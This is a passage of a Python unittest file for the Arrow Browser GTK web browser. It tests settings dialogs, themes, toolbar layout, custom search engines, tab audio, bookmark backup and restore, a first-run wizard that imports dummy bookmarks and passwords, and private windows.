            self.assertEqual(opened, ["https://github.com/Sangam1112/Arrow-Browser"])
            self.assertEqual(self.win.notebook.get_n_pages(), pages)
        finally:
            dialog.destroy()

    def test_about_page_is_short(self):
        # No web engine row, and no explanation under "Project page on GitHub" or "Check for updates"; the
        # update row's line only appears to report a check.
        def labels(widget):
            if isinstance(widget, Gtk.Label):
                return [widget] if widget.get_visible() else []
            kids = widget.get_children() if isinstance(widget, Gtk.Container) else ()
            return [t for child in kids for t in labels(child)]

        def row_texts(dialog, title):
            label = next(l for l in labels(dialog) if l.get_text() == title)
            row = label.get_parent()
            while not hasattr(row, "_arrow_button"):
                row = row.get_parent()
            return row, [l.get_text() for l in labels(row)]

        dialog = self.win.build_settings_dialog("about")
        try:
            texts = [l.get_text() for l in labels(dialog)]
            self.assertFalse([t for t in texts if t.startswith("Web engine")], "no web engine row")
            for title, button in (("Project page on GitHub", "Open"), ("Check for updates", "Check now")):
                extra = [t for t in row_texts(dialog, title)[1] if t not in (title, button) and len(t) > 3]
                self.assertEqual(extra, [], f"no text under {title}")
            row, _ = row_texts(dialog, "Check for updates")
            real = bb.fetch_release_info
            bb.fetch_release_info = lambda *a, **k: {"version": bb.APP_VERSION}
            try:
                row._arrow_button.clicked()
                self.assertTrue(spin(lambda: "up to date" in row._arrow_subtitle.get_text(), 5))
                self.assertTrue(row._arrow_subtitle.get_visible())
            finally:
                bb.fetch_release_info = real
        finally:
            dialog.destroy()

    # ---- browser theme -------------------------------------------------------
    def test_browser_theme_switches_live_and_is_saved(self):
        win = self.win
        self.addCleanup(win.set_ui_theme, "dark")
        self.assertEqual(win.ui_theme, "dark", "dark stays the default")
        top_bar_colour = lambda: win.top_bar.get_style_context().get_property(
            "background-color", Gtk.StateFlags.NORMAL).to_string()
        dark = top_bar_colour()
        dialog = win.build_settings_dialog("general")
        try:
            buttons = dialog._arrow_controls["ui_theme"]
            self.assertTrue(buttons["dark"].get_active())
            buttons["light"].set_active(True)  # what a click does
            self.assertEqual(win.ui_theme, "light")
            self.assertEqual(top_bar_colour(), "rgb(255,255,255)", "light theme applies without a restart")
            with open(bb.CONFIG_FILE) as f:
                self.assertEqual(json.load(f)["ui_theme"], "light")
            buttons["dark"].set_active(True)
            self.assertEqual(top_bar_colour(), dark)
        finally:
            dialog.destroy()
        win.set_ui_theme("neon")
        self.assertEqual(win.ui_theme, "dark", "unknown themes are ignored")

    def test_toolbar_buttons_move_to_one_side_live_and_are_saved(self):
        win = self.win
        self.addCleanup(win.set_toolbar_side, "split")
        self.assertEqual(win.toolbar_side, "split", "split stays the default")
        order = lambda: [c for c in win.top_bar.get_children() if c in win._toolbar_items]
        nav, url, *rest = win._toolbar_items
        self.assertEqual(order(), [nav, url, *rest])
        dialog = win.build_settings_dialog("general")
        try:
            buttons = dialog._arrow_controls["toolbar_side"]
            self.assertTrue(buttons["split"].get_active())
            buttons["left"].set_active(True)  # what a click does
            self.assertEqual(order(), [nav, *rest, url], "every button left of the address bar")
            with open(bb.CONFIG_FILE) as f:
                self.assertEqual(json.load(f)["toolbar_side"], "left")
            buttons["right"].set_active(True)
            self.assertEqual(order(), [url, nav, *rest], "every button right of the address bar")
            buttons["split"].set_active(True)
            self.assertEqual(order(), [nav, url, *rest])
        finally:
            dialog.destroy()
        win.set_toolbar_side("middle")
        self.assertEqual(win.toolbar_side, "split", "unknown sides are ignored")

    def test_toolbar_icons_are_line_icons_in_the_buttons_colour(self):
        win = self.win
        self.addCleanup(win.set_ui_theme, "dark")
        buttons = (win.btn_back, win.btn_forward, win.btn_reload, win.btn_new_tab, win.btn_screenshot,
                   win.btn_bookmarks, win.btn_downloads, win.btn_shield, win.btn_settings)
        for button in buttons:
            self.assertIsInstance(button.get_image(), bb.LineIcon)
            self.assertIsNotNone(button.get_image().get_property("surface"), "drawn")
        self.assertEqual(win.btn_bookmarks.get_image()._shapes, bb.TOOLBAR_ICONS["book-marked"],
                         "not a second star next to the address bar's")

        def drawn(button):
            return button.get_image()._drawn[2]  # the colour the icon was last drawn in

        def text_colour(button):
            c = button.get_style_context().get_color(button.get_state_flags())
            return "#%02x%02x%02x" % tuple(round(v * 255) for v in (c.red, c.green, c.blue))

        dark = {b: drawn(b) for b in (win.btn_back, win.btn_shield)}
        win.set_ui_theme("light")
        spin(lambda: False, 0.2)
        for button in (win.btn_back, win.btn_shield):
            self.assertNotEqual(drawn(button), dark[button], "redrawn for the light theme")
            self.assertEqual(drawn(button), text_colour(button))
        self.assertNotEqual(drawn(win.btn_back), drawn(win.btn_shield), "the shield keeps its own green")
        win.btn_back.set_state_flags(Gtk.StateFlags.PRELIGHT, False)  # hover
        try:
            spin(lambda: False, 0.3)  # past the colour transition
            self.assertEqual(drawn(win.btn_back), text_colour(win.btn_back), "follows hover")
        finally:
            win.btn_back.unset_state_flags(Gtk.StateFlags.PRELIGHT)

    # ---- search ----------------------------------------------------------
    def test_search_shortcuts_and_own_search_engines(self):
        win = self.win
        saved_engine, saved_custom = win.search_engine, list(win.custom_search_engines)

        def restore():
            win.custom_search_engines = saved_custom
            win.set_search_engine(saved_engine)
        self.addCleanup(restore)
        self.assertIsNone(win.add_custom_search_engine("Local", "LT", self.base + "/done?q=%s"))
        self.assertIn("already", win.add_custom_search_engine("local", "zz", self.base + "/done?q=%s"))
        self.assertIn("already used", win.add_custom_search_engine("Other", "w", self.base + "/done?q=%s"))
        self.assertIn("%s", win.add_custom_search_engine("Other", "o", self.base + "/done"))
        with open(bb.CONFIG_FILE) as f:
            self.assertEqual(json.load(f)["custom_search_engines"],
                             [{"name": "Local", "keyword": "lt", "url": self.base + "/done?q={query}"}])

        win.url_entry.set_text("lt hello world")
        win.on_url_activate(win.url_entry)
        self.assertTrue(spin(lambda: "/done?q=hello%20world" in Handler.requests, 8), Handler.requests)

        win.set_search_engine("Local")
        dialog = win.build_settings_dialog("general")
        try:
            combo = dialog._arrow_controls["search_engine"]
            self.assertEqual(combo.get_active_text(), "Local")
            self.assertIn("Local", [row[0] for row in combo.get_model()])
        finally:
            dialog.destroy()
        win.url_entry.set_text("plain words")
        win.on_url_activate(win.url_entry)
        self.assertTrue(spin(lambda: "/done?q=plain%20words" in Handler.requests, 8), Handler.requests)
        self.assertIn("Local", win.url_entry.get_placeholder_text())

        win.remove_custom_search_engine("Local")
        self.assertEqual(win.search_engine, bb.DEFAULT_SEARCH_ENGINE, "removing the default engine falls back")
        self.assertEqual(win.custom_search_engines, [])

    # ---- tab audio ---------------------------------------------------------
    def test_tab_mute_button_follows_the_page(self):
        win = self.win
        tab_box = win.get_active_tab_box()
        wv, button = tab_box._arrow_webview, tab_box._arrow_audio_btn
        self.addCleanup(wv.set_is_muted, False)
        self.assertFalse(button.get_visible(), "silent tabs show no speaker")
        wv.set_is_muted(True)  # the notify::is-muted signal updates the tab
        self.assertTrue(spin(lambda: button.get_visible() and button.get_label() == "🔇", 2))
        win.toggle_tab_muted(tab_box)
        self.assertFalse(wv.get_is_muted())
        self.assertFalse(button.get_visible())

        # A tab playing sound (pages can't autoplay sound in a test, so a stand-in webview)
        state = {"playing": True, "muted": False}
        stand_in = type("StandIn", (), {"is_playing_audio": lambda self: state["playing"],
                                        "get_is_muted": lambda self: state["muted"]})()
        fake_tab = type("Tab", (), {})()
        fake_tab._arrow_webview, fake_tab._arrow_audio_btn = stand_in, Gtk.Button(label="?")
        win._update_tab_audio(fake_tab)
        self.assertTrue(fake_tab._arrow_audio_btn.get_visible())
        self.assertEqual(fake_tab._arrow_audio_btn.get_label(), "🔊")
        self.assertEqual(fake_tab._arrow_audio_btn.get_tooltip_text(), "Mute tab")
        state["playing"] = False
        win._update_tab_audio(fake_tab)
        self.assertFalse(fake_tab._arrow_audio_btn.get_visible(), "hidden again once the sound stops")

    # ---- export and backup ---------------------------------------------------
    def test_export_bookmarks_and_restore_a_backup(self):
        win = self.win
        saved = (list(win.bookmarks), win.adblock_enabled, win.download_dir, win.homepage)

        def restore():
            win.bookmarks, win.adblock_enabled, win.download_dir, win.homepage = saved
            bb.save_bookmarks(win.bookmarks)
            win.save_settings()
        self.addCleanup(restore)
        folder = tempfile.mkdtemp(dir=_HOME)
        win.bookmarks = [{"url": "https://kept.example/", "title": "Kept", "added": 1700000000}]
        self.assertEqual(win.export_bookmarks_to(os.path.join(folder, "marks.html")), 1)
        with open(os.path.join(folder, "marks.html")) as f:
            self.assertEqual([b["url"] for b in bb.parse_netscape_bookmarks(f.read())], ["https://kept.example/"])
        self.assertEqual(os.stat(os.path.join(folder, "marks.html")).st_mode & 0o077, 0)

        win.site_settings["zoomed.example"] = {"zoom": 1.5}
        win.homepage = "https://home.example"
        backup_path = os.path.join(folder, "backup.json")
        win.write_backup_to(backup_path)
        self.assertEqual(os.stat(backup_path).st_mode & 0o077, 0, "the backup is private to the user")

        # things change after the backup ...
        win.bookmarks = []
        win.site_settings.clear()
        win.homepage = "https://other.example"
        win.download_dir = folder  # this computer's own; a restore keeps it
        restored, added_b, sites = win.apply_backup(win.read_backup_file(backup_path))
        self.assertGreater(restored, 10)
        self.assertEqual((added_b, sites), (1, 1))
        self.assertEqual(win.homepage, "https://home.example")
        self.assertEqual(win.download_dir, folder)
        self.assertEqual(win.site_settings["zoomed.example"], {"zoom": 1.5})
        self.assertEqual([b["url"] for b in win.bookmarks], ["https://kept.example/"])
        with open(bb.CONFIG_FILE) as f:
            self.assertEqual(json.load(f)["homepage"], "https://home.example")

        with open(os.path.join(folder, "not-a-backup.json"), "w") as f:
            f.write("{}")
        with self.assertRaises(ValueError):
            win.read_backup_file(os.path.join(folder, "not-a-backup.json"))

    def test_welcome_wizard_applies_choices_and_runs_once(self):
        win = self.win
        saved = (win.search_engine, win.homepage, win.ui_theme, win.adblock_enabled, list(win.bookmarks),
                 dict(win.secrets.items))
        profile = os.path.join(_HOME, ".config", "chromium", "Default")
        os.makedirs(profile, exist_ok=True)
        with open(os.path.join(profile, "Bookmarks"), "w") as f:
            json.dump({"roots": {"bookmark_bar": {"type": "folder", "children": [
                {"type": "url", "name": "Wiz", "url": "https://wizard-import.example/"}]}}}, f)
        with open(os.path.join(profile, "Preferences"), "w") as f:
            json.dump({"homepage": "https://imported-home.example/", "homepage_is_newtabpage": False}, f)

        def restore():
            win.set_search_engine(saved[0])
            win.homepage, win.adblock_enabled, win.bookmarks = saved[1], saved[3], saved[4]
            win.set_ui_theme(saved[2])
            win.set_toolbar_side("split")
            win.secrets.items = saved[5]
            win.first_run_greeted = True
            win.save_settings()
            bb.save_bookmarks(win.bookmarks)
            shutil.rmtree(os.path.join(_HOME, ".config", "chromium"), ignore_errors=True)
            for name in ("_choose_file", "_ask"):
                win.__dict__.pop(name, None)
        self.addCleanup(restore)
        win.first_run_greeted = False
        dialog = win.open_welcome_wizard()
        self.addCleanup(lambda: dialog.get_visible() and dialog.destroy())
        stack, c = dialog._arrow_stack, dialog._arrow_controls
        self.assertEqual([stack.child_get_property(ch, "name") for ch in stack.get_children()],
                         ["welcome", "search", "import", "look", "privacy", "done"])
        self.assertEqual(stack.get_visible_child_name(), "welcome")
        self.assertTrue(dialog.get_titlebar().get_visible(), "the title bar (and its close button) is shown")

        # search engine, and its front page as the home page only while the box is ticked
        dialog._arrow_go(1)
        self.assertFalse(c["homepage_follows_search"].get_active(), "a home page of the user's own isn't replaced")
        c["homepage_follows_search"].set_active(True)
        c["search_engine"]["Brave Search"].set_active(True)
        self.assertEqual((win.search_engine, win.homepage), ("Brave Search", "https://search.brave.com"))
        c["homepage_follows_search"].set_active(False)
        self.assertEqual(win.homepage, saved[1])
        with open(bb.CONFIG_FILE) as f:
            self.assertEqual(json.load(f)["search_engine"], "Brave Search")

        # import from the other browser's profile, home page included
        dialog._arrow_go(2)
        self.assertEqual(dialog._arrow_profiles[0]["browser"], "Chromium")
        c["import_button"].clicked()
        self.assertTrue(spin(lambda: "Imported" in c["import_status"].get_text(), 10), c["import_status"].get_text())
        self.assertIn("https://wizard-import.example/", [b["url"] for b in win.bookmarks])
        self.assertEqual(win.homepage, "https://imported-home.example/")

        # passwords from a .csv: logins already saved are kept, the file is deleted when the user says so
        win.secrets.items[("kept.example", "me")] = "original"
        csv_path = os.path.join(_HOME, "passwords.csv")
        with open(csv_path, "w") as f:
            f.write("name,url,username,password\nk,https://kept.example/,me,changed\n"
                    "n,https://new.example/login,you,fresh\n")
        win._choose_file = lambda *a, **k: csv_path
        win._ask = lambda *a, **k: True
        win.import_passwords_interactive(dialog, c["import_status"])
        self.assertTrue(spin(lambda: "Saved" in c["import_status"].get_text(), 10), c["import_status"].get_text())
        self.assertEqual(win.secrets.items[("new.example", "you")], "fresh")
        self.assertEqual(win.secrets.items[("kept.example", "me")], "original")
        self.assertFalse(os.path.exists(csv_path), "the plain-text export is deleted")

        # look and privacy apply at once; pages show what's really in effect
        dialog._arrow_go(3)
        c["ui_theme"]["light"].set_active(True)
        self.assertEqual(win.ui_theme, "light")
        self.assertTrue(c["toolbar_side"]["split"].get_active())
        c["toolbar_side"]["left"].set_active(True)
        self.assertEqual(win.toolbar_side, "left")
        self.assertEqual(win.top_bar.get_children().index(win.url_entry), len(win._toolbar_items) - 1,
                         "the address bar moved after every button")
        dialog._arrow_go(4)
        c["adblock_enabled"].set_active(False)
        self.assertFalse(win.adblock_enabled)
        win.adblock_enabled, win.homepage = True, "https://kept-home.example"
        dialog._arrow_go(1)
        dialog._arrow_go(4)
        self.assertTrue(c["adblock_enabled"].get_active())
        self.assertEqual(win.homepage, "https://kept-home.example", "re-syncing the pages changes nothing")

        dialog._arrow_go(5)
        dialog.response(Gtk.ResponseType.CLOSE)
        self.assertTrue(win.first_run_greeted)
        with open(bb.CONFIG_FILE) as f:
            self.assertTrue(json.load(f)["first_run_greeted"], "shown once, not on every start")

    def test_private_window_never_writes_site_settings(self):
        private = bb.ArrowBrowserWindow(private=True)
        try:
            self.assertEqual(private.site_settings, {})
            bb.set_site_value(private.site_settings, "x.test", "zoom", 2.0)
            before = os.path.exists(bb.SITE_SETTINGS_FILE) and open(bb.SITE_SETTINGS_FILE).read()
            private._save_site_settings()
            after = os.path.exists(bb.SITE_SETTINGS_FILE) and open(bb.SITE_SETTINGS_FILE).read()
            self.assertEqual(before, after)
            self.assertIsNone(private.password_script, "no password detection in private windows")
        finally:
            private.destroy()


    def test_windows_get_minimize_and_maximize_buttons_under_wsl(self):
        original = bb.running_under_wsl
        bb.running_under_wsl = lambda: True
        try:
            wsl = bb.ArrowBrowserWindow(private=True)
        finally:
            bb.running_under_wsl = original
        try:
            self.assertEqual(wsl._titlebar.get_decoration_layout(), ":minimize,maximize,close")
        finally:
            wsl.destroy()
        self.assertIsNone(self.win._titlebar.get_decoration_layout(), "on Linux the desktop's own layout is kept")


if __name__ == "__main__":
    unittest.main()
